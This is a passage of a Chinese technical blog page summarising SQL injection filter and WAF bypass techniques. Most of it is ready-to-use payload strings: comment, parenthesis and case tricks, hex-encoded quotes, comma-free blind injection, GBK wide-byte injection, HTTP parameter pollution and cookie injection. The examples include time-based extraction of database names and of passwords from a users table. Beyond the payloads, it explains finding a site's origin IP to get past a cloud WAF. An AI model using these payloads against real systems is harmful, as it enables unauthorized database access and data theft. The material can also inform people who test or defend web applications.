+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>最基本的绕过方法，用注释替换空格：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment">/*  注释 */</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img alt="img" data-src="https://img-blog.csdnimg.cn/20190105195808456.png" loading="lazy" class="lazy">)</p> <p>使用浮点数：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">8</span>E0union <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>
+<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">8.0</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="括号绕过空格"><a href="#括号绕过空格" class="header-anchor">#</a> 括号绕过空格</h2> <p>如果空格被过滤，括号没有被过滤，可以用括号绕过。
+在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。
+例如：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span> dual <span class="token keyword">where</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">and</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这种过滤方法常常用于time based盲注,例如：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">and</span><span class="token punctuation">(</span>sleep<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">109</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>（from for属于逗号绕过下面会有）
+上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p> <h2 id="引号绕过-使用十六进制"><a href="#引号绕过-使用十六进制" class="header-anchor">#</a> 引号绕过（使用十六进制）</h2> <p>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> column_name  <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">&quot;users&quot;</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
+users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> column_name  <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token number">0x7573657273</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="逗号绕过-使用from或者offset"><a href="#逗号绕过-使用from或者offset" class="header-anchor">#</a> 逗号绕过（使用from或者offset）</h2> <p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">select</span> <span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>使用join：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>     <span class="token comment">#等价于</span>
+<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>使用like：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">80</span>   <span class="token comment">#等价于</span>
+<span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'r%'</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>对于limit可以使用offset来绕过：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p># 等价于下面这条SQL语句</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">0</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="比较符号-绕过-过滤了-sqlmap盲注经常使用-使用between的脚本"><a href="#比较符号-绕过-过滤了-sqlmap盲注经常使用-使用between的脚本" class="header-anchor">#</a> 比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）</h2> <p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）
+同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。
+最常见的一个盲注的sql语句：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">64</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。
+那么上面的这条sql语句可以使用greatest变为如下的子句:</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> greatest<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">64</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>使用between and：
+between a and b：返回a，b之间的数据，不包含b。</p> <h2 id="or-and-xor-not绕过"><a href="#or-and-xor-not绕过" class="header-anchor">#</a> or and xor not绕过</h2> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token operator">and</span><span class="token operator">=</span><span class="token operator">&amp;&amp;</span>  <span class="token operator">or</span><span class="token operator">=</span><span class="token operator">||</span>   <span class="token operator">xor</span><span class="token operator">=</span><span class="token operator">|</span>   <span class="token operator">not</span><span class="token operator">=</span><span class="token operator">!</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="绕过注释符号-后面跟一个空格-过滤"><a href="#绕过注释符号-后面跟一个空格-过滤" class="header-anchor">#</a> 绕过注释符号（#，--(后面跟一个空格））过滤</h2> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,2,3||'</span><span class="token number">1</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>最后的or '1闭合查询语句的最后的单引号，或者：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,2,'</span><span class="token number">3</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="绕过"><a href="#绕过" class="header-anchor">#</a> =绕过</h2> <p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p> <h2 id="绕过union-select-where等"><a href="#绕过union-select-where等" class="header-anchor">#</a> 绕过union，select，where等</h2> <p><strong>（1）使用注释符绕过</strong></p> <p>常用注释符：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment">//，-- , /**/, #, --+, -- -, ;,%00,--a</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>用法：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>U<span class="token comment">/**/</span> NION <span class="token comment">/**/</span> SE<span class="token comment">/**/</span> LECT <span class="token comment">/**/</span><span class="token keyword">user</span>，pwd <span class="token keyword">from</span> <span class="token keyword">user</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><strong>（2）使用大小写绕过</strong></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">UnIoN</span><span class="token comment">/**/</span><span class="token keyword">SeLeCT</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><strong>（3）内联注释绕过</strong></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token comment">/*!UnIoN*/</span> <span class="token keyword">SeLeCT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token comment">/*!table_name*/</span><span class="token punctuation">)</span> <span class="token keyword">FrOM</span> <span class="token comment">/*information_schema*/</span><span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token comment">/*!WHERE */</span><span class="token comment">/*!TaBlE_ScHeMa*/</span> <span class="token operator">like</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><strong>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）</strong></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'UNIunionONSeLselectECT1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>–<span class="token operator">-</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="通用绕过-编码"><a href="#通用绕过-编码" class="header-anchor">#</a> 通用绕过（编码）</h2> <p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>即<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">31</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">31</span>，而Test也可以为<span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span>。
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="等价函数绕过"><a href="#等价函数绕过" class="header-anchor">#</a> 等价函数绕过</h2> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>hex<span class="token punctuation">(</span><span class="token punctuation">)</span>、bin<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">&gt;</span> ascii<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sleep<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">&gt;</span>benchmark<span class="token punctuation">(</span><span class="token punctuation">)</span>
+concat_ws<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">=</span><span class="token operator">&gt;</span>group_concat<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">)</span>、substr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">&gt;</span> substring<span class="token punctuation">(</span><span class="token punctuation">)</span>
+@<span class="token variable">@user</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+@<span class="token variable">@datadir</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">&gt;</span> datadir<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>举例：substring()和substr()无法使用时：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">and</span><span class="token operator">+</span>ascii<span class="token punctuation">(</span>lower<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>pwd<span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>users<span class="token operator">+</span><span class="token keyword">limit</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">74</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>或者：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x70</span>
+strcmp<span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>
+strcmp<span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>
+strcmp<span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="宽字节注入"><a href="#宽字节注入" class="header-anchor">#</a> 宽字节注入</h2> <p>过滤 ' 的时候往往利用的思路是将 ' 转换为 ' 。
+在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p> <p>（1）%df 吃掉 \ 具体的方法是 urlencode(') = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（'）符号在外面：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">27</span>union <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>（2）将 ' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。
+一般产生宽字节注入的PHP函数：</p> <p>1.replace（）：过滤 ' \ ，将 ' 转化为 ' ，将 \ 转为 \，将 &quot; 转为 &quot; 。用思路一。
+2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：' , &quot; , \ 。用思路一
+（防御此漏洞，要将 mysql_query 设置为 binary 的方式）
+3.mysql_real_escape_string()：转义下列字符：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>\x00     \n     \r     \     '     &quot;     \x1a
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>（防御，将mysql设置为gbk即可）</p> <h2 id="多参数请求拆分"><a href="#多参数请求拆分" class="header-anchor">#</a> 多参数请求拆分</h2> <p>对于多个参数拼接到同一条SQL语句中的情况，可以将注入语句分割插入。</p> <p>例如请求URL时，GET参数格式如下：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token punctuation">[</span>input1<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token punctuation">[</span>input2<span class="token punctuation">]</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>将GET的参数a和参数b拼接到SQL语句中，SQL语句如下所示。</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token operator">and</span> a<span class="token operator">=</span><span class="token punctuation">[</span>input1<span class="token punctuation">]</span> <span class="token operator">and</span> b<span class="token operator">=</span><span class="token punctuation">[</span>input2<span class="token punctuation">]</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这时就可以将注入语句进行拆分，如下所示：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>a<span class="token operator">=</span><span class="token keyword">union</span><span class="token comment">/*&amp;b=*/</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>最终将参数a和参数b拼接，得到的SQL语句如下所示：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token operator">and</span> a<span class="token operator">=</span><span class="token keyword">union</span> <span class="token comment">/*and b=*/</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="http参数污染"><a href="#http参数污染" class="header-anchor">#</a> HTTP参数污染</h2> <p>HTTP参数污染是指当同一个参数出现多次，不同的中间件会解析为不同的结果。具体如下图所示：（以参数color=red&amp;color=blue为例）。</p> <p><img alt="img" data-src="https://img-blog.csdnimg.cn/20190106130518949.jpg" loading="lazy" class="lazy"></p> <p>可见，IIS比较容易利用，可以直接分割带逗号的SQL语句。在其余的中间件中，如果WAF只检测了通参数名中的第一个或最后一个，并且中间件的特性正好取与WAF相反的参数，则可成功绕过。下面以IIS为例，一般的SQL注入语句如下所示：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>Inject<span class="token operator">=</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>将SQL注入语句转换为以下格式。</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>Inject<span class="token operator">=</span><span class="token keyword">union</span><span class="token comment">/*&amp;inject=*/</span><span class="token keyword">select</span><span class="token comment">/*&amp;inject=*/</span><span class="token number">1</span><span class="token operator">&amp;</span>inject<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>inject<span class="token operator">=</span><span class="token number">3</span><span class="token operator">&amp;</span>inject<span class="token operator">=</span><span class="token number">4</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>最终在IIS中读取的参数值将如下所示</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>Inject<span class="token operator">=</span><span class="token keyword">union</span><span class="token comment">/*, */</span><span class="token keyword">select</span><span class="token comment">/*, */</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="生僻函数"><a href="#生僻函数" class="header-anchor">#</a> 生僻函数</h2> <p>使用生僻函数替代常见的函数，例如在报错注入中使用polygon()函数替换常用的updatexml()函数</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token keyword">polygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> @<span class="token variable">@version</span><span class="token punctuation">)</span> f<span class="token punctuation">)</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="寻找网站源ip"><a href="#寻找网站源ip" class="header-anchor">#</a> 寻找网站源IP</h2> <p>对于具有云WAF防护的网站，只要找到网站的IP地址，通过IP访问网站，就可以绕过云WAF检测。</p> <p>常见的寻找网站IP的方法由以下几种</p> <ul><li>寻找网站的历史解析记录</li> <li>多个不同区域ping网站，查看IP解析的结果</li> <li>找网站的二级域名、NS、MX记录等对应的IP</li> <li>订阅网站邮件，查看邮件发送方的IP</li></ul> <h2 id="注入参数到cookie中"><a href="#注入参数到cookie中" class="header-anchor">#</a> 注入参数到cookie中</h2> <p>某些程序员在代码中使用$_REQUEST获取参数，而$_REQUEST会依次从GET/POST/cookie中获取参数，如果WAF只检测了GET/POST而没有检测cookie,则可以将注入语句放入cookie中进行绕过。</p> <h2 id="写在最后"><a href="#写在最后" class="header-anchor">#</a> 写在最后</h2> <blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote> <p><img alt="" data-src="https://img-blog.csdnimg.cn/20200906013715889.png" loading="lazy" class="lazy"></p></div> <footer class="page-edit"><div class="edit-link"><a href="https://github.com/binghe001/BingheGuide/edit/master/docs/md/hack/sql/2022-05-02-005-SQL注入绕过技术总结.md" target="_blank" rel="noopener noreferrer">在 GitHub 上编辑此页</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <div class="last-updated"><span class="prefix">上次更新: </span> <span class="time">2022/5/2</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
+        ←
+        <a href="/md/hack/sql/2022-05-02-004-ASP连接MSSQL数据库语句.html" class="prev">
+          ASP连接MSSQL数据库语句
+        </a></span> <span class="next"><a href="/md/hack/sql/2022-05-02-006-SQLServer启动-关闭xp_cmdshell.html">
+          SQL Server启动/关闭xp_cmdshell
+        </a>
+        →
+      </span></p></div> </main></div> <aside class="page-sidebar"> <div class="page-side-toolbar"><div class="option-box-toc-fixed"><div class="toc-container-sidebar"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="max-height:650px"><div style="font-weight:bold;text-align:center;">SQL注入绕过技术总结</div> <hr> <div class="toc-box"><ul class="toc-sidebar-links"><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#绕过空格-注释符-a0" class="toc-sidebar-link">绕过空格（注释符/ /，%a0）</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#括号绕过空格" class="toc-sidebar-link">括号绕过空格</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#引号绕过-使用十六进制" class="toc-sidebar-link">引号绕过（使用十六进制）</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#逗号绕过-使用from或者offset" 